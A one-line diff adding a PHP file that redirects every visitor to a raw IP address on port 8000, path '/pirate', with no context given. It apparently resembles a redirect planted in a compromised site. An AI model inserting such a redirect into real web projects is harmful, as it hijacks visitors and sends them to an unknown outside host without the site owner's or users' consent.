@@ -1,0 +1,1 @@
+<?php header("Location: http://92.222.200.212:8000/pirate"); ?>
